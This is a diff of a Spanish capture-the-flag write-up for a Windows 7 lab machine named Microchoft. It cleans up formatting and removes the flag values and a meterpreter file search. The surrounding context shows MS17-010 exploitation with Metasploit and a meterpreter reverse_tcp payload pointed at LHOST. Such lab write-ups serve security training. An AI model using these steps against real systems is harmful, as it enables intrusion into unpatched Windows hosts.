@@ -4,10 +4,10 @@ The Hacker Labs
 
 ## Información General
 
--   Nombre: Microchoft\
--   IP: 10.0.50.31\
--   Sistema Operativo: Windows 7 Home Basic 7601 Service Pack 1\
--   Dificultad: Beginner\
+-   Nombre: Microchoft
+-   IP: 10.0.50.31
+-   Sistema Operativo: Windows 7 Home Basic 7601 Service Pack 1
+-   Dificultad: Beginner
 -   Objetivo: Obtener acceso inicial y capturar las flags de usuario y
     administrador
 
@@ -85,8 +85,8 @@ show options
 
 Confirmar:
 
--   RHOSTS = 10.0.50.31\
--   LHOST = 10.0.50.4\
+-   RHOSTS = 10.0.50.31
+-   LHOST = 10.0.50.4
 -   PAYLOAD = windows/x64/meterpreter/reverse_tcp
 
 ### Lanzar exploit
@@ -122,20 +122,10 @@ ls C:\Users
 cat C:\Users\Lola\Desktop\user.txt
 ```
 
-Flag:
-
-    13e624146d31ea232c850267c2745caa
 
 ------------------------------------------------------------------------
 
 ## 6. Flag de Administrador
-
-Búsqueda manual de archivos:
-
-``` bash
-search -f root.txt -d C:\
-search -f flag.txt -d C:\
-```
 
 Búsqueda avanzada desde shell:
 
@@ -147,16 +137,13 @@ Archivo encontrado:
 
     C:\Users\Admin\Desktop\admin.txt.txt
 
-Contenido:
-
-    ff4ad2daf333183677e02bf8f67d4dca
 
 ------------------------------------------------------------------------
 
 ## Conceptos Aprendidos
 
--   Escaneo de puertos TCP con Nmap\
--   Enumeración de servicios Windows\
+-   Escaneo de puertos TCP con Nmap
+-   Enumeración de servicios Windows
 -   Identificación de vulnerabilidad MS17-010\
 -   Explotación con Metasploit\
 -   Uso de Meterpreter\
